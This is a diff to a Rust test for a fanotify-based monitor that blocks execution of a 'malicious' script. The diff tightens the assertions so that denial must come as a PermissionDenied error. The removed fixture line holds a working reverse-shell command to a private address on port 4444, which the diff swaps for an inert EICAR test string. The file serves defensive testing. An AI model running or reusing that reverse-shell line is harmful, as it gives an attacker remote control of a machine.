@@ -251,8 +251,15 @@ fn test_privileged_linux_fanotify_execution_blocking() {
         let monitor = match FanotifyPermissionMonitor::init_with_target(Some(&test_dir)) {
             Ok(m) => m,
             Err(e) => {
+                if std::env::var("KERNLOCK_REQUIRE_PRIVILEGED").is_ok() {
+                    panic!(
+                        "MANDATORY PRIVILEGED TEST FAILED: init_with_target failed on {}: {}",
+                        test_dir.display(),
+                        e
+                    );
+                }
                 println!(
-                    "Unable to mark fanotify on directory ({}); skipping test",
+                    "[SKIPPED] Unable to mark fanotify on directory ({}); skipping test",
                     e
                 );
                 return;
@@ -293,14 +300,21 @@ fn test_privileged_linux_fanotify_execution_blocking() {
         }
 
         let clean_res = std::process::Command::new(&clean_script).status();
-        assert!(clean_res.is_ok());
-        assert!(clean_res.unwrap().success());
+        assert!(
+            clean_res.is_ok(),
+            "Benign script execution failed: {:?}",
+            clean_res
+        );
+        assert!(
+            clean_res.unwrap().success(),
+            "Benign script did not exit with status 0"
+        );
 
-        // 2. Malicious executable script
+        // 2. Malicious executable script (inert EICAR test signature fixture: never attempts network connections)
         let malicious_script = test_dir.join("malicious.sh");
         std::fs::write(
             &malicious_script,
-            "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+            "#!/bin/sh\n# X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\nexit 0\n",
         )
         .unwrap();
         #[cfg(unix)]
@@ -311,9 +325,30 @@ fn test_privileged_linux_fanotify_execution_blocking() {
         }
 
         let malicious_res = std::process::Command::new(&malicious_script).status();
-        // Execution must either return an OS error (e.g. PermissionDenied) or exit non-zero
-        assert!(malicious_res.is_err() || !malicious_res.unwrap().success());
-        assert!(blocked_count.load(Ordering::SeqCst) >= 1);
+        // Mandatory OS-level error verification: fanotify FAN_DENY causes kernel execve to fail with EPERM / PermissionDenied
+        assert!(
+            malicious_res.is_err(),
+            "Kernel must deny execution attempt via FAN_DENY; command should return OS error, got: {:?}",
+            malicious_res
+        );
+        let err = malicious_res.unwrap_err();
+        assert_eq!(
+            err.kind(),
+            std::io::ErrorKind::PermissionDenied,
+            "Expected OS PermissionDenied (EPERM) error when execution is blocked by fanotify, got: {:?}",
+            err
+        );
+
+        // Verify threat callback fired and monitor health remained Running
+        assert!(
+            blocked_count.load(Ordering::SeqCst) >= 1,
+            "Threat callback must have incremented blocked_count"
+        );
+        assert_eq!(
+            FanotifyPermissionMonitor::global_health().0,
+            FanotifyMonitorHealth::Running,
+            "Monitor health must remain Running during execution blocking"
+        );
 
         monitor.stop();
         assert_eq!(
